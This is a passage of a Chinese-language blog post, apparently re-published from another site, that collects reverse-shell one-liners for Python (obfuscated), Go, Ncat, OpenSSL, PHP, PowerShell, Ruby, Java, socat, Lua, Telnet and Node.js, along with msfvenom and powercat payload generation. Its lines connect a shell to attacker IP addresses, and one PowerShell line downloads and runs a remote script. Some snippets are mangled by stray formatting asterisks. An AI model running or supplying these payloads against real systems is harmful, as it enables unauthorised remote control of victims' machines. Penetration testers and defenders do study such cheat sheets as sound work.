+<pre class="line-numbers language-python"><code class="language-python">C<span class="token punctuation">:</span>\Python27\python<span class="token punctuation">.</span>exe <span class="token operator">-</span>c <span class="token string">"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="Golang反弹shell"><a href="#Golang反弹shell" class="headerlink" title="Golang反弹shell"></a>Golang反弹shell</h3><pre class="line-numbers language-go"><code class="language-go">echo <span class="token string">'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'</span> <span class="token operator">></span> <span class="token operator">/</span>tmp<span class="token operator">/</span>t<span class="token punctuation">.</span><span class="token keyword">go</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">go</span> run <span class="token operator">/</span>tmp<span class="token operator">/</span>t<span class="token punctuation">.</span><span class="token keyword">go</span> <span class="token operator">&amp;&amp;</span> rm <span class="token operator">/</span>tmp<span class="token operator">/</span>t<span class="token punctuation">.</span><span class="token keyword">go</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="Ncat反弹shell"><a href="#Ncat反弹shell" class="headerlink" title="Ncat反弹shell"></a>Ncat反弹shell</h3><pre class="line-numbers language-bash"><code class="language-bash">ncat 127.0.0.1 4444 -e /bin/bash
+ncat --udp 127.0.0.1 4444 -e /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="OpenSSL反弹shell"><a href="#OpenSSL反弹shell" class="headerlink" title="OpenSSL反弹shell"></a>OpenSSL反弹shell</h3><pre class="line-numbers language-ocaml"><code class="language-ocaml">openssl req <span class="token operator">-</span>x509 <span class="token operator">-</span>newkey rsa<span class="token punctuation">:</span><span class="token number">4096</span> <span class="token operator">-</span>keyout key<span class="token punctuation">.</span>pem <span class="token operator">-</span>out cert<span class="token punctuation">.</span>pem <span class="token operator">-</span>days <span class="token number">365</span> <span class="token operator">-</span>nodes
+openssl s<span class="token punctuation">_</span>server <span class="token operator">-</span>quiet <span class="token operator">-</span>key key<span class="token punctuation">.</span>pem <span class="token operator">-</span>cert cert<span class="token punctuation">.</span>pem <span class="token operator">-</span>port <span class="token number">4242</span>
+ncat <span class="token operator">--</span>ssl <span class="token operator">-</span>vv <span class="token operator">-</span>l <span class="token operator">-</span>p <span class="token number">4242</span> 
+mkfifo <span class="token operator">/</span>tmp<span class="token operator">/</span>s<span class="token punctuation">;</span> <span class="token operator">/</span>bin<span class="token operator">/</span>sh <span class="token operator">-</span>i <span class="token operator">&lt;</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>s <span class="token number">2</span><span class="token operator">>&amp;</span><span class="token number">1</span> \<span class="token operator">|</span> openssl s<span class="token punctuation">_</span>client <span class="token operator">-</span>quiet <span class="token operator">-</span>connect <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">4242</span> <span class="token operator">></span> <span class="token operator">/</span>tmp<span class="token operator">/</span>s<span class="token punctuation">;</span> rm <span class="token operator">/</span>tmp<span class="token operator">/</span>s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="crontab反弹shell"><a href="#crontab反弹shell" class="headerlink" title="crontab反弹shell"></a>crontab反弹shell</h3><pre class="line-numbers language-bash"><code class="language-bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
+ncat --ssl -vv -l -p 4242 
+<span class="token function">mkfifo</span> /tmp/s<span class="token punctuation">;</span> /bin/sh -i <span class="token operator">&lt;</span> /tmp/s 2<span class="token operator">></span><span class="token operator">&amp;</span>1 \<span class="token operator">|</span> openssl s_client -quiet -connect 127.0.0.1:4242 <span class="token operator">></span> /tmp/s<span class="token punctuation">;</span> <span class="token function">rm</span> /tmp/s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="PHP反弹shell"><a href="#PHP反弹shell" class="headerlink" title="PHP反弹shell"></a>PHP反弹shell</h3><pre class="line-numbers language-php"><code class="language-php">php <span class="token operator">-</span>r '<span class="token variable">$sock</span><span class="token operator">=</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token string">"10.0.0.1"</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="Powershell反弹shell"><a href="#Powershell反弹shell" class="headerlink" title="Powershell反弹shell"></a>Powershell反弹shell</h3><pre class="line-numbers language-powershell"><code class="language-powershell">powershell <span class="token operator">-</span>NoP <span class="token operator">-</span>NonI <span class="token operator">-</span>W Hidden <span class="token operator">-</span>Exec Bypass <span class="token operator">-</span>Command <span class="token operator">*</span><span class="token operator">*</span>New*<span class="token operator">*</span>-<span class="token operator">*</span><span class="token operator">*</span>Object*<span class="token operator">*</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TCPClient<span class="token punctuation">(</span><span class="token string">"[IPADDR]"</span><span class="token punctuation">,</span><span class="token namespace">[PORT]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span> = <span class="token variable">$client</span><span class="token punctuation">.</span>GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token operator">*</span>byte*<span class="token operator">*</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token variable">$bytes</span> = 0<span class="token punctuation">.</span><span class="token punctuation">.</span>65535\<span class="token punctuation">|</span><span class="token operator">%</span><span class="token punctuation">{</span>0<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token operator">*</span><span class="token keyword">while</span>*<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$i</span> = <span class="token variable">$stream</span><span class="token punctuation">.</span>Read<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$bytes</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token variable">$data</span> = <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span>New*<span class="token operator">*</span>-<span class="token operator">*</span><span class="token operator">*</span>Object*<span class="token operator">*</span> <span class="token operator">-</span>TypeName System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>ASCIIEncoding<span class="token punctuation">)</span><span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback</span> = <span class="token punctuation">(</span><span class="token function">iex</span> <span class="token variable">$data</span> 2>&amp;1 \<span class="token punctuation">|</span> Out-<span class="token operator">*</span><span class="token operator">*</span>String*<span class="token operator">*</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback2</span> = <span class="token variable">$sendback</span> <span class="token operator">+</span> <span class="token string">"PS "</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">pwd</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Path <span class="token operator">+</span> <span class="token string">"> "</span><span class="token punctuation">;</span><span class="token variable">$sendbyte</span> = <span class="token punctuation">(</span><span class="token namespace">[text.encoding]</span>::ASCII<span class="token punctuation">)</span><span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token variable">$sendback2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span><span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token variable">$sendbyte</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$sendbyte</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span><span class="token punctuation">.</span>Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$client</span><span class="token punctuation">.</span>Close<span class="token punctuation">(</span><span class="token punctuation">)</span> 
+
+powershell <span class="token operator">-</span>nop <span class="token operator">-</span>c <span class="token string">"<span class="token variable">$client</span> = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);<span class="token variable">$stream</span> = <span class="token variable">$client</span>.GetStream();[byte[]]<span class="token variable">$bytes</span> = 0..65535\|%{0};while((<span class="token variable">$i</span> = <span class="token variable">$stream</span>.Read(<span class="token variable">$bytes</span>, 0, <span class="token variable">$bytes</span>.Length)) -ne 0){;<span class="token variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="token variable">$bytes</span>,0, <span class="token variable">$i</span>);<span class="token variable">$sendback</span> = (iex <span class="token variable">$data</span> 2>&amp;1 \| Out-String );<span class="token variable">$sendback2</span> = <span class="token variable">$sendback</span> + 'PS ' + (pwd).Path + '> ';<span class="token variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="token variable">$sendback2</span>);<span class="token variable">$stream</span>.Write(<span class="token variable">$sendbyte</span>,0,<span class="token variable">$sendbyte</span>.Length);<span class="token variable">$stream</span>.Flush()};<span class="token variable">$client</span>.Close()"</span>
+
+powershell <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="Ruby反弹shell"><a href="#Ruby反弹shell" class="headerlink" title="Ruby反弹shell"></a>Ruby反弹shell</h3><pre class="line-numbers language-ruby"><code class="language-ruby">ruby <span class="token operator">-</span>rsocket <span class="token operator">-</span>e<span class="token string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d >&amp;%d 2>&amp;%d",f,f,f)'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>不依赖于/bin/sh的反弹shell</p>
+<pre class="line-numbers language-ruby"><code class="language-ruby">ruby <span class="token operator">-</span>rsocket <span class="token operator">-</span>e <span class="token string">'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>如果目标系统运行Windows反弹shell</p>
+<pre class="line-numbers language-ruby"><code class="language-ruby">ruby <span class="token operator">-</span>rsocket <span class="token operator">-</span>e <span class="token string">'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="Java反弹shell"><a href="#Java反弹shell" class="headerlink" title="Java反弹shell"></a>Java反弹shell</h3><pre class="line-numbers language-java"><code class="language-java">r <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> p <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">]</span> <span class="token operator">*</span><span class="token operator">*</span>as<span class="token operator">*</span><span class="token operator">*</span> <span class="token operator">*</span><span class="token operator">*</span>String<span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="socat反弹shell"><a href="#socat反弹shell" class="headerlink" title="socat反弹shell"></a>socat反弹shell</h3><pre class="line-numbers language-scala"><code class="language-scala">socat exec<span class="token operator">:</span><span class="token string">'bash -li'</span><span class="token punctuation">,</span>pty<span class="token punctuation">,</span>stderr<span class="token punctuation">,</span>setsid<span class="token punctuation">,</span>sigint<span class="token punctuation">,</span>sane tcp<span class="token operator">:</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">79.137</span><span class="token operator">:</span><span class="token number">5555</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="Lua反弹shell"><a href="#Lua反弹shell" class="headerlink" title="Lua反弹shell"></a>Lua反弹shell</h3><p>Linux</p>
+<pre class="line-numbers language-lua"><code class="language-lua">lua <span class="token operator">-</span>e <span class="token string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3');"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Windows</p>
+<pre class="line-numbers language-lua"><code class="language-lua">lua5<span class="token punctuation">.</span><span class="token number">1</span> <span class="token operator">-</span>e <span class="token string">'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, '</span>r<span class="token string">') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="Telnet反弹shell"><a href="#Telnet反弹shell" class="headerlink" title="Telnet反弹shell"></a>Telnet反弹shell</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rm</span> -f /tmp/p<span class="token punctuation">;</span> <span class="token function">mknod</span> /tmp/p p <span class="token operator">&amp;&amp;</span> telnet ATTACKING-IP 80 0/tmp/p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>获取反弹shell后，可使用python获得交互式shell</p>
+<pre class="line-numbers language-python"><code class="language-python">python <span class="token operator">-</span>c<span class="token string">'import pty; pty.spawn("/bin/bash")'</span> python <span class="token operator">-</span>c <span class="token triple-quoted-string string">''' import pty while(1):   try:     pty.spawn("/bin/bash")   except :     contiune'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="Nodejs反弹shell"><a href="#Nodejs反弹shell" class="headerlink" title="Nodejs反弹shell"></a>Nodejs反弹shell</h3><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token operator">**</span><span class="token keyword">function</span><span class="token operator">**</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token operator">**</span><span class="token keyword">var</span><span class="token operator">**</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"net"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    cp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    sh <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">**</span><span class="token keyword">var</span><span class="token operator">**</span> client <span class="token operator">=</span> <span class="token operator">**</span><span class="token keyword">new</span><span class="token operator">**</span> net<span class="token punctuation">.</span><span class="token function">Socket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  client<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token number">8080</span><span class="token punctuation">,</span> <span class="token string">"10.17.26.64"</span><span class="token punctuation">,</span> <span class="token operator">**</span><span class="token keyword">function</span><span class="token operator">**</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    client<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>stdin<span class="token punctuation">)</span><span class="token punctuation">;</span>    sh<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>    sh<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">**</span><span class="token keyword">return</span><span class="token operator">**</span> <span class="token regex">/a/</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">// Prevents the Node.js application form crashing*})(); **or** require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]') **or** -**var** x = global.process.mainModule.require-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash') **or** https:*//gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="C反弹shell"><a href="#C反弹shell" class="headerlink" title="C反弹shell"></a>C反弹shell</h3><pre class="line-numbers language-c"><code class="language-c">$ gcc c_revese_shell<span class="token punctuation">.</span>c <span class="token operator">-</span>o cshell$ <span class="token punctuation">.</span><span class="token operator">/</span>cshell <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.128</span> <span class="token number">8080</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="UDP反弹shell"><a href="#UDP反弹shell" class="headerlink" title="UDP反弹shell"></a>UDP反弹shell</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token operator">*</span><span class="token comment" spellcheck="true">// 注意这里务必要用udp的模式来接*</span>
+$ nc <span class="token operator">-</span>l <span class="token operator">-</span>p <span class="token number">53</span> <span class="token operator">-</span>u$ python udpshell<span class="token punctuation">.</span>py <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.128</span> <span class="token number">53</span> udp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="MSF生成反弹shell"><a href="#MSF生成反弹shell" class="headerlink" title="MSF生成反弹shell"></a>MSF生成反弹shell</h3><p><a href="https://www.uedbox.com/?s=metasploit" target="_blank" rel="noopener">metasploit</a> 是一个非常强大的渗透工具箱，当然也包括了反弹语句的生成与接收反弹shell的平台。它也能生成反弹shell<a href="https://www.uedbox.com/post/6051/" target="_blank" rel="noopener">一句话</a>。</p>
+<pre class="line-numbers language-makefile"><code class="language-makefile">msf > msfvenom -l payloads <span class="token string">'cmd/unix/reverse'</span> <span class="token operator">|</span> grep unix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>msfvenom 有点类似于生成的语句，当然这个工具还可以用来生成<a href="https://www.uedbox.com/?s=shellcode" target="_blank" rel="noopener">shellcode</a>之类的。-l 是查找所有的pyaloads。cmd/unix/reverse 是关键词过滤。为了找到攻击debain的语句，就加了个正则。</p>
+<p><strong>生成bash反弹shell</strong></p>
+<pre><code>## 首先查看命令的参数
+msf &gt; msfvenom -p cmd/unix/reverse_netcat --list-options&gt;&gt; LPORT &gt;&gt; LHOSTmsfvenom -p cmd/unix/reverse_bash lhost=192.168.79.127 lport=5555</code></pre><h3 id="WIndows反弹shell补充"><a href="#WIndows反弹shell补充" class="headerlink" title="WIndows反弹shell补充"></a>WIndows反弹shell补充</h3><p>除了上面这些可以通用的语言反弹shell之外，可能最重要的就是powershell了，当然还有vbs（2003以下的系统），所以Windows反弹shell还是非常重要的技能。</p>
+<pre class="line-numbers language-powershell"><code class="language-powershell">*<span class="token operator">/</span><span class="token operator">/</span> 可能是因为cmd默认的字符集<span class="token namespace">[gbk]</span>所以才会乱码<span class="token punctuation">,</span>如果是英文系统就不会了<span class="token operator">*</span>
+$ powershell –exec bypass –Command <span class="token string">"&amp; {Import-Module 'C:\mini-reverse.ps1'}"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h4 id="powercat反弹shell，其实就是powershell版的netcat"><a href="#powercat反弹shell，其实就是powershell版的netcat" class="headerlink" title="powercat反弹shell，其实就是powershell版的netcat"></a>powercat反弹shell，其实就是powershell版的netcat</h4><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> <span class="token function">Set</span><span class="token operator">-</span>ExecutionPolicy UnrestrictedPS 
+C:\> cd <span class="token punctuation">.</span>\powercatPS 
+C:\powercat> <span class="token function">Import-Module</span> <span class="token punctuation">.</span>\powercat<span class="token punctuation">.</span>ps1PS 
+C:\powercat> powercat <span class="token operator">-</span>c 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>128 <span class="token operator">-</span>p 8080 <span class="token operator">-</span>e cmd <span class="token operator">-</span>g >> payload<span class="token punctuation">.</span>ps1
+C:\>nc <span class="token operator">-</span>lvp 8080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后,把payload.ps1丢到目标机器上去执行</p>
+<pre class="line-numbers language-powershell"><code class="language-powershell">powershell –exec bypass –Command <span class="token string">"&amp; {Import-Module 'C:\payload.ps1'}"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><ul>
+<li><a href="https://github.com/lukechilds/reverse-shell" target="_blank" rel="noopener">https://github.com/lukechilds/reverse-shell</a></li>
+<li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md]" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources/Reverse Shell Cheatsheet.md)</li>
+</ul>
+<h3 id="ew网络穿透工具反弹Shell"><a href="#ew网络穿透工具反弹Shell" class="headerlink" title="ew网络穿透工具反弹Shell"></a>ew网络穿透工具反弹Shell</h3><p><a href="https://github.com/idlefire/ew" target="_blank" rel="noopener">https://github.com/idlefire/ew</a></p>
+<h3 id="frp网络穿透工具反弹Shell"><a href="#frp网络穿透工具反弹Shell" class="headerlink" title="frp网络穿透工具反弹Shell"></a>frp网络穿透工具反弹Shell</h3><p><a href="https://github.com/fatedier/frp/releases/tag/v0.36.2" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases/tag/v0.36.2</a></p>
+<hr>
+<p>原文连接：<a href="https://www.uedbox.com/post/54632/" target="_blank" rel="noopener">https://www.uedbox.com/post/54632/</a></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力!</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/img/zfb.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/img/wx.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+            
+            
+            <div class="reprint1">
+                <p>
+                    <span class="reprint1-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="http://xingher.cn" class="b-link-green">XingHe</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
